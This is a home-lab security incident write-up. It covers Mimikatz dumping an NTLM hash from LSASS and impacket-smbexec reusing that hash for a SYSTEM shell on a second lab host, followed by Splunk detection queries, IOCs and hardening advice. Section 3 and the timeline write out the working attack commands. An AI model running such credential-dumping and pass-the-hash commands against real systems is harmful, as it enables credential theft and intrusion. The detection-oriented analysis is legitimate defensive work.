# Incident AD-04: Pass-the-Hash Lateral Movement via Impacket smbexec

**Investigation ID:** AD-04
**Date:** July 2026
**Analyst:** Shakshi
**Lab Environment:** SOC.LAB (SOC Home Lab - VirtualBox)
**MITRE ATT&CK Techniques:** T1550.002 (Pass the Hash), T1003.001 (LSASS Memory Dump), TA0008 (Lateral Movement), TA0006 (Credential Access)

---

## 1. Executive Summary

Using a low-privilege domain account (`Jsmith`) with local administrator rights on a compromised Windows workstation, the attacker ran Mimikatz to dump NTLM credential hashes from LSASS memory without ever recovering the plaintext password. The extracted NTLM hash (`2b576acbe6bcfda7294d6bd18041b8fe`) was passed directly to Impacket's `smbexec` tool to authenticate to a second machine (WindowsClient11, 192.168.10.21) over SMB — achieving a `NT AUTHORITY\SYSTEM` interactive shell with no password required.

This investigation demonstrates a complete credential access → lateral movement chain: credential dumping from memory (T1003.001) feeding directly into Pass-the-Hash (T1550.002), bypassing password cracking entirely. Unlike Kerberoasting (AD-02), PtH requires no offline cracking phase - the hash itself is a valid authentication token in NTLM. Detection required correlating three distinct event types in Splunk: LSASS access (credential dumping), NTLM network logon (Event ID 4624 Logon Type 3), and post-exploitation activity on the target host.

## 2. Timeline of Events

| Time | Event |
|---|---|
| T+0:00 | Attacker on compromised host runs Mimikatz: `privilege::debug` succeeds (Privilege 20 OK) |
| T+0:00 | `sekurlsa::logonpasswords` dumps LSASS memory; Jsmith NTLM hash extracted: `2b576acbe6bcfda7294d6bd18041b8fe` |
| T+0:01 | Attacker runs `impacket-smbexec SOC.LAB/Jsmith@192.168.10.21 -hashes :2b576acbe6bcfda7294d6bd18041b8fe` from Kali |
| T+0:01 | SMB authentication to WindowsClient11 (192.168.10.21) succeeds via NTLM hash |
| T+0:01 | Impacket smbexec drops service binary to Windows root folder; new Windows service created |
| T+0:01 | `whoami` confirms `nt authority\system` on WindowsClient11 |
| T+0:02 | `ipconfig` confirms lateral access to 192.168.10.21 (WindowsClient11) |
| T+~5 min | Splunk detects Event ID 4624 (NTLM, Logon Type 3) from 192.168.10.5 targeting Jsmith on WindowsClient11 |
| T+~5 min | Splunk transaction query correlates: executable dropped in Windows root + new service creation + suspicious cmd execution within a 2-minute window |

## 3. Attack Methodology

**Tools:** Mimikatz 2.2.0 x64, Impacket smbexec

### Phase 1 - Credential Dumping (T1003.001)

Executed on a Windows host where `Jsmith` had an active interactive session:

```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords
```

Mimikatz interfaces with the `lsass.exe` process to extract cached credential material from memory. For `Jsmith`, the output contained:

```
* Username : Jsmith
* Domain   : SOC
* NTLM     : 2b576acbe6bcfda7294d6bd18041b8fe
* SHA1      : e30d1c18c56c027667d35734660751dc80203354
```

`privilege::debug` is required to obtain the `SeDebugPrivilege` right needed to read `lsass.exe` memory. This succeeds when the attacker already has local administrator access on the machine.

### Phase 2 - Pass-the-Hash Lateral Movement (T1550.002)

Executed from Kali-Attacker (192.168.10.5):

```bash
impacket-smbexec SOC.LAB/Jsmith@192.168.10.21 -hashes :2b576acbe6bcfda7294d6bd18041b8fe
```

The format `-hashes :NTLM` passes an empty LM hash and the full NTLM hash. Impacket uses this to authenticate over SMB (port 445) via NTLM challenge-response without needing the plaintext password. On the target, `smbexec` creates a temporary Windows service that executes commands and pipes output back over SMB - the entire shell interaction happens through this service channel.

**Why this works:** NTLM authentication is hash-based - the protocol never transmits or compares the plaintext password. Any party holding the correct NTLM hash can authenticate as that user against any NTLM-accepting service, regardless of whether the password itself is known.

**Post-exploitation confirmation:**
```
C:\Windows\System32> whoami
nt authority\system

C:\Windows\System32> ipconfig
IPv4 Address: 192.168.10.21
```

`NT AUTHORITY\SYSTEM` indicates the service created by smbexec ran with SYSTEM privileges, giving full control of WindowsClient11.

**MITRE ATT&CK mapping:**
- **T1003.001 - OS Credential Dumping: LSASS Memory** (credential access phase)
- **T1550.002 - Use Alternate Authentication Material: Pass the Hash** (lateral movement phase)
- **TA0008 - Lateral Movement**
- **TA0006 - Credential Access** 

## 4. Log Evidence

**Event ID 4624 - Successful NTLM Network Logon (Splunk detection):**

Splunk SPL used to isolate the PtH logon:
```spl
index=main sourcetype=_json data.win.system.eventID=4624
| search data.win.eventdata.authenticationPackageName="NTLM"
         data.win.eventdata.logonType="3"
| rename data.win.eventdata.targetUserName as user
| rename data.win.eventdata.ipAddress as src_ip
| table _time user src_ip
```

Results: 4 events on 2026-07-05, all `Jsmith` from `192.168.10.5` - the Kali attacker host. Logon Type 3 (network logon) with NTLM on a domain where Kerberos is standard is the primary PtH indicator, because Impacket forces NTLM rather than using Kerberos, which is what legitimate domain logons use.

**Event ID 4776 - Credential Validation at DC (Splunk detection):**

```spl
index=main data.win.system.eventID=4776
| table _time data.win.system.computer data.win.eventdata.targetUserName data.win.eventdata.status
```

Results: 2 events on `DC01.SOC.LAB` - `Jsmith` (09:37) and `Administrator` (10:41), both with status `0x0` (success). This confirms NTLM authentication was validated at the domain controller, consistent with a PtH chain where the hash is forwarded to the DC for validation.

**Splunk transaction correlation - smbexec service/command behavior:**

```spl
index=main agent.name=WindowsClient11
| search rule.description IN (
    "Suspicious Windows cmd shell execution",
    "Executable dropped in Windows root folder",
    "New Windows Service Created"
)
| transaction maxspan=2m
| table _time duration rule.description
```

Three correlated events within 2-minute windows on 2026-07-05:
- `Executable dropped in Windows root folder` - smbexec drops its service binary to `C:\Windows\`
- `New Windows Service Created` - smbexec creates a temporary service to execute commands
- `Suspicious Windows cmd shell execution` - cmd.exe spawned under the service context

This transaction pattern is the post-exploitation fingerprint of smbexec. All three events occurring within 2 minutes of an anomalous NTLM Logon Type 3 is a high-confidence lateral movement indicator.

**Screenshot references:**

### Attack
- `attack/mimikatz-hash-dump.png` - Mimikatz `sekurlsa::logonpasswords` output showing Jsmith NTLM hash extraction
- `attack/smbexec-system-shell.png` - impacket-smbexec achieving `NT AUTHORITY\SYSTEM` shell on WindowsClient11 (192.168.10.21)

### Detection
- `detection/splunk-4624-ntlm-logon.png` - Splunk SPL showing 4 Event ID 4624 NTLM Logon Type 3 events from 192.168.10.5 as Jsmith
- `detection/splunk-4776-credential-validation.png` - Splunk Event ID 4776 showing NTLM credential validation for Jsmith and Administrator at DC01.SOC.LAB
- `detection/splunk-transaction-smbexec.png` - Splunk transaction query correlating service creation + executable drop + cmd execution within 2-minute window on WindowsClient11

## 5. Network Evidence

SMB traffic (TCP port 445) was generated from 192.168.10.5 (Kali-Attacker) to 192.168.10.21 (WindowsClient11) during the lateral movement phase. 

NTLM authentication to the domain controller (DC01.SOC.LAB, 192.168.10.10) also occurred as part of the pass-through validation chain visible in Event ID 4776.

## 6. IOC Table

| Indicator | Value | Notes |
|---|---|---|
| Attacker host | 192.168.10.5 (Kali-Attacker) | Source of smbexec lateral movement |
| Compromised user | Jsmith@SOC.LAB | Account whose hash was dumped and passed |
| NTLM hash | `2b576acbe6bcfda7294d6bd18041b8fe` | Extracted from LSASS; passed directly without cracking |
| Target host | 192.168.10.21 (WindowsClient11) | Lateral movement destination |
| Access achieved | NT AUTHORITY\SYSTEM | Full system compromise via smbexec service |
| Tool: credential dump | Mimikatz 2.2.0 | `privilege::debug` + `sekurlsa::logonpasswords` |
| Tool: lateral movement | Impacket smbexec | SMB-based semi-interactive shell, no plaintext password |
| Detection event 1 | Event ID 4624, Logon Type 3, NTLM | NTLM network logon - anomalous on Kerberos domain |
| Detection event 2 | Event ID 4776 | NTLM credential validation at DC01 |
| Detection event 3 | Service creation + cmd execution (transaction) | Post-exploitation smbexec behavioral signature |

## 7. Root Cause

Two conditions enabled this attack: (1) `Jsmith` had local administrator rights on the initial compromised host, allowing Mimikatz to read LSASS memory with `SeDebugPrivilege`; and (2) NTLM authentication was permitted for network logons to WindowsClient11 (SMB port 445 accessible, no NTLMv2 enforcement or SMB signing requirement that would prevent relay/pass). PtH is fundamentally a consequence of NTLM's hash-based authentication design, the hash is the credential rather than a software vulnerability that can be patched.

## 8. Impact Assessment

**Severity: Critical**

Full SYSTEM-level access was obtained on a second domain-joined host using only a hash - no password recovery required. From a `NT AUTHORITY\SYSTEM` context on a domain-joined machine, an attacker can: dump additional credentials from that machine's LSASS, move laterally again to further hosts, access any local resources, install persistence mechanisms, and potentially reach the domain controller depending on network segmentation. This represents a classic lateral movement chain that, in a real environment, would allow progressive expansion through the domain until a domain admin hash is obtained.

## 9. Recommendations

1. **Enable Protected Users Security Group** for all privileged accounts - members cannot authenticate via NTLM, effectively blocking PtH for those accounts.
2. **Enforce Credential Guard** (Windows Defender Credential Guard) on domain-joined workstations, which uses virtualization-based security to isolate LSASS memory and prevent Mimikatz-style hash extraction.
3. **Require SMB signing** on all domain-joined machines (`RequireSecuritySignature = 1` in GPO) - this does not prevent PtH but blocks SMB relay attacks that often accompany it.
4. **Restrict local administrator rights** - limit which accounts have local admin access on workstations; an unprivileged user cannot run `privilege::debug` or read LSASS.
5. **Alert on NTLM Logon Type 3 events** where Kerberos would be expected - filter for `EventID=4624, AuthenticationPackageName=NTLM, LogonType=3` from non-service accounts; this is the primary PtH detection signal.
6. **Monitor LSASS process access** via Sysmon Event ID 10 (`ProcessAccess` targeting `lsass.exe`) - any non-system process reading LSASS is a strong credential dumping indicator.
7. **Restrict `SeDebugPrivilege`** via GPO - by default it is granted to local admins; removing it prevents tools like Mimikatz from functioning even with admin access.

## 10. Lessons Learned

This investigation completes the three-phase AD attack chain started in AD-01 through AD-04: enumerate (AD-01) → Kerberoast a service account (AD-02) → use the cracked password to gain access → dump NTLM hashes via Mimikatz → move laterally via PtH. The most important detection lesson here is the difference between detecting the attack tool versus detecting the attack behavior. Detecting Mimikatz by signature is unreliable - it is frequently modified and renamed. Detecting `SeDebugPrivilege` acquisition + LSASS memory reads via Sysmon, and detecting NTLM Logon Type 3 in a Kerberos-default environment via SIEM, are behavioral detections that survive tool changes. The transaction-based Splunk correlation is a particularly strong post-exploitation indicator because it reflects what smbexec *does*, not what it *is*.
